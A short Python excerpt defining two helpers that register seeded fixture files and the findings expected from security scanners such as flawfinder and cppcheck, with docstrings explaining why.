def add_signal(path: str, signal: str, tool: str | None = None) -> None:
    """Attach an ADDITIONAL expectation to a file that add() already created.

    Needed because one seeded file can legitimately prove two different scanners. cpp/vuln.c
    carries strcpy and a format-string bug (flawfinder) AND a double free (cppcheck) — and
    because the verifier matches tool-agnostically by default, either scanner silently covered
    for the other. The contract read green with one of them completely broken.
    """
    EXTRA_SIGNALS.append((path, signal, tool))


def add(path: str, body: str, signal: str | None, tool: str | None = None) -> None:
    """signal=None plants a file that is deliberately NOT expected to produce a finding.

    Needed because some files are inputs a scanner reads rather than evidence it reports on.
    Asserting a signal against such a file makes the suite fail for a reason that is not a
    defect, and the usual reflex — weaken the assertion until it passes — teaches exactly the
    wrong lesson. Say the file has no expectation, and say why.
    """
    FILES.append((path, textwrap.dedent(body).lstrip("\n"), signal, tool))


